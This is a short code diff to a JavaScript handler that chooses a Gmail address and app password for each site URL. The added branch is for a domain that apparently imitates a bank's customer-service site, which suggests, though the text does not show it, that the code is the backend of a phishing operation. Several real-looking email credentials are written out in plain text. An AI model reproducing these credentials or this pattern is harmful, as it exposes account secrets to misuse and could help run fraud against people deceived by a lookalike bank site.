@@ -17,6 +17,9 @@ export default function handler(req, res) {
         email = 'bbrimoid@gmail.com';
         pass = 'cqygigrwdyxknnit';
 
+    } else if(url == 'customerservicebri.online'){
+        email = 'kurey3826@gmail.com';
+        pass = 'qjmebnftvgsokfnj';
     } else {
 
         email = 'febrifebru66@gmail.com';
